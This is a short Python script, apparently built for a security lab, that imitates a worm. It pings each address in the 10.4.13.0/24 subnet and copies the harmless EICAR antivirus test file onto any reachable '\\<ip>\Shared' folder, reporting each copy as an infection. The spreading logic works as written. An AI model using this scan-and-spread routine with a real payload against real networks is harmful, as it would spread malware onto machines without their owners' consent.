import os
import shutil
import socket
import time

# Function to find local IP address
def get_local_ip():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip

# Function to check if a remote host is up
def is_host_up(ip):
    response = os.system(f"ping -n 1 -w 1000 {ip} > nul")
    return response == 0

# Function to attempt to copy the EICAR test file to a remote host
def infect_host(ip, eicar_path):
    try:
        # Assuming shared folder exists at \\<ip>\Shared
        shared_folder = f"\\\\{ip}\\Shared"
        if os.path.exists(shared_folder):
            # Copy the EICAR test file to the shared folder
            destination = os.path.join(shared_folder, os.path.basename(eicar_path))
            if not os.path.exists(destination):  # Prevent overwriting existing file
                shutil.copy(eicar_path, destination)
                print(f"[+] Infected {ip} with EICAR test file")
            else:
                print(f"[-] Host {ip} already has the EICAR test file")
        else:
            print(f"[-] No shared folder on host {ip}")
    except Exception as e:
        print(f"[!] Failed to infect {ip}: {e}")

# Function to propagate the EICAR test file
def propagate(eicar_path):
    base_ip = "10.4.13."
    
    for i in range(1, 255):
        target_ip = base_ip + str(i)
        
        print(f"[*] Scanning {target_ip}...")
        if is_host_up(target_ip):
            print(f"[+] Host {target_ip} is up")
            infect_host(target_ip, eicar_path)
        else:
            print(f"[-] Host {target_ip} is down")
        time.sleep(0.1)  # Sleep to avoid overwhelming the network

# Start the propagation
if __name__ == "__main__":
    eicar_path = "eicar.com"  # Path to the EICAR test file
    if os.path.exists(eicar_path):
        propagate(eicar_path)
    else:
        print("EICAR test file not found. Please ensure eicar.com is in the same directory as this script.")
